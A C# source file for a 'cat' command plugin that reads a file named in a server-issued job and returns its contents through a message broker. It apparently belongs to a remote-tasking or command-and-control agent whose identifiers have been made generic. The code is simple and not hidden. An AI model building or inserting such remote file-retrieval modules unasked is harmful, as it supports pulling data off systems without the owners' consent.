using Workflow.Contracts;

using Workflow.Contracts;
using System;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System.Text.Json;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "cat";
        private IDataBroker messageManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.tokenManager = context.TokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                if (!args.ContainsKey("path"))
                {
                    DebugLog.Log($"{Name} missing path parameter [{job.task.id}]");
                    messageManager.Write("Missing path parameter", job.task.id, true, "error");
                    return;
                }

                if (!File.Exists(args["path"]))
                {
                    DebugLog.Log($"{Name} file not found: {args["path"]} [{job.task.id}]");
                    messageManager.Write("File does not exist", job.task.id, true, "error");
                    return;
                }

                DebugLog.Log($"{Name} reading file: {args["path"]} [{job.task.id}]");
                string fileContents = File.ReadAllText(args["path"].ToString().Replace("\"", ""));

                if(string.IsNullOrEmpty(fileContents))
                {
                    fileContents = string.Empty;
                }

                messageManager.Write(fileContents, job.task.id, true);
                DebugLog.Log($"{Name} completed [{job.task.id}]");
                return;
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error [{job.task.id}]: {e.Message}");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
